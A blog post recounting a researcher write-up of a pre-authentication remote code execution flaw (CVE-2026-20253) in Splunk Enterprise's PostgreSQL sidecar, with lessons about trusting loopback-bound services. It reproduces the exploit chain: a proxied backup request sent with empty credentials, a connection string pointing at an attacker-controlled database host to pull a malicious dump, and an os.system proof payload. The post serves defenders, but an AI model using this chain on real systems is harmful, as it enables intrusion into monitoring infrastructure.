+++
title = "The SIEM That Lets You In: Splunk's Pre-Auth RCE"
date = "2026-06-18"
+++

I spend my working day inside Splunk. So when the analysis of CVE-2026-20253, a pre-authentication RCE in Splunk Enterprise, came out, I read it the way you'd read a report about your own house. The vulnerability is in the PostgreSQL Sidecar Service, a component I had never heard of. That is exactly the problem.

## The advisory said less than it hinted

Splunk's June 10 advisory had the shape of something serious: no authentication required, CVSS 9.8, and a name long enough to be a sentence. But it didn't say "RCE" anywhere. That combination — high score, no explicit impact — is the kind of thing that makes researchers suspicious. The writeup is a masterclass in what to do with that suspicion.

The first question was deployment scope. Reading the advisory carefully:

- Splunk Enterprise on-prem, manual install on Windows: sidecar not installed by default
- Splunk Enterprise on-prem, manual install: installed but not enabled by default
- Splunk Enterprise on AWS: installed and enabled by default

So the default AWS deployment is vulnerable out of the box. The sidecar concept arrived in Splunk 10, and the advisory covers versions 10 and above.

## The loopback assumption

The sidecar binary, `splunk-postgres`, listens on two ports, both bound to 127.0.0.1:

```text
tcp   LISTEN ... 127.0.0.1:5435    0.0.0.0:*    users:(("splunk-postgres",pid=4067,fd=12))
tcp   LISTEN ... 127.0.0.1:33669   0.0.0.0:*    users:(("splunk-postgres",pid=4067,fd=3))
```

Loopback-only. Most people stop there and call it not remotely exploitable. watchTowr's line is the one I keep quoting to myself: "localhost only often translates to not really localhost only." The question is whether something else on the box can reach it. In Splunk's case, the answer is the main web application on port 8000.

The sidecar is a Go binary, 66MB of it. Reversing Go is a special kind of pain, so they went with `strings` and documentation. Splunk's own docs described a backup/restore flow for the data management control plane, with a `backupFile` and a `database` parameter, under `/v1/postgres/` paths. Enumeration confirmed the surface:

```text
/v1/postgres/telemetry
/v1/postgres/health
/v1/postgres/recovery/backup
/v1/postgres/recovery/restore
/v1/postgres/recovery/status/{id}
/v1/postgres/status
```

## The proxy that made it remote

The key discovery: the main Splunk web app proxies requests to the local PostgreSQL API. The request that worked:

```http
POST /en-US/splunkd/__raw/v1/postgres/recovery/backup HTTP/1.1
Host: target
Content-Type: application/json
Authorization: Basic ***

{"database":"search_metadata","backupFile":"backuptest"}
```

Note the Authorization header: `Basic Og==` is base64 of `:`, empty credentials. The sidecar accepts anything. The response came back `200 OK` with a `BackupPending` state. Arbitrary file creation and truncation, no auth, through the web interface.

## From file write to code execution

The chain watchTowr built goes through PostgreSQL's own features. The `database` parameter isn't just a name, it's a connection string. So:

1. Point the backup at an attacker-controlled PostgreSQL server: `database: "hostaddr=attacker.db.watchTowr.local"`. The sidecar connects out and pulls a malicious database dump
2. Use the restore endpoint with a crafted connection string: `database: "dbname=template1 passfile=/opt/splunk/var/packages/data/postgres/.pgpass"`. The `passfile` option reads a file path
3. The restore process executes a malicious function from the dump, which writes an attacker-controlled Python script into the Splunk filesystem

The proof:

```python
# /opt/splunk/etc/apps/splunk_secure_gateway/bin/ssg_enable_modular_input.py
import os; os.system("id > /opt/splunk/share/splunk/search_mrsparkle/exposed/watchTowr.txt")
```

And `watchTowr.txt` appeared in the webroot. Pre-auth RCE on the default AWS deployment of the most common SIEM on the planet.

## Three things, in the order they hit me

First, the loopback assumption is dead. Every service that binds to 127.0.0.1 is one proxy rule away from being internet-facing. The proxy in this case was Splunk's own web app. When I look at a listening socket now, the question isn't "is it bound to localhost," it's "what else on this box can reach it."

Second, the fix is a one-liner in the right place: the sidecar should reject empty credentials. Splunk patched it, and watchTowr shipped a detection script that checks whether the endpoint returns 400 (vulnerable) or 401 (patched) for any credentials. That's the whole vulnerability in one HTTP status code.

Third, and this is the one that stays with me: the component that let attackers in was a sidecar I'd never heard of, installed by default on the AWS deployment, doing a job (PostgreSQL management) that has nothing to do with what Splunk is for. The attack surface of a system is not the system. It's everything the system drags along with it. I've been inside Splunk for years and I didn't know this component existed. Neither, I suspect, did most of the people running it.
